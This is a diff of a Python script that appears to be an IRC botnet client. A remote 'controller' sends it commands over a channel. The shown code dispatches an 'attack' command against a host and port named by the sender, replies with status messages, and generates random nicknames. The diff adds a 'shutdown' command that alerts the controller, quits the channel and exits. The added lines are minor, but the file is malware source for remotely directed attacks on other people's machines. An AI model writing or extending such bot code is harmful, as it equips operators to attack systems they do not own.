@@ -86,7 +86,16 @@ def attack(s, sender, host, port):
     except:
         s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : attack failed\r\n', 'utf-8'))
 
-
+def shutdown(sender):
+    # send notif to controller
+    cont_msg = privmsg(sender, 'shutting down')
+    s.send(cont_msg.encode('utf-8'))
+    # quit channel
+    quit_msg = privmsg(CHAN, 'QUIT')
+    s.send(quit_msg.encode('utf-8'))
+    s.close()
+    sys.exit(1)
+    return
 
 # returns random 5 char string
 def generate_nickname(length):
@@ -182,6 +191,10 @@ if __name__ == "__main__":
                                         attack(s, sender, arguments[1], int(arguments[2]))
                                     else:
                                         s.send(bytearray('PRIVMSG ' + sender + ' :' + NICK + ' : invalid attack\r\n', 'utf-8'))
+
+                                elif 'shutdown' in args[1]:
+                                    shutdown(sender)
+                                    break
 
                     #print(response)
                 s.close()
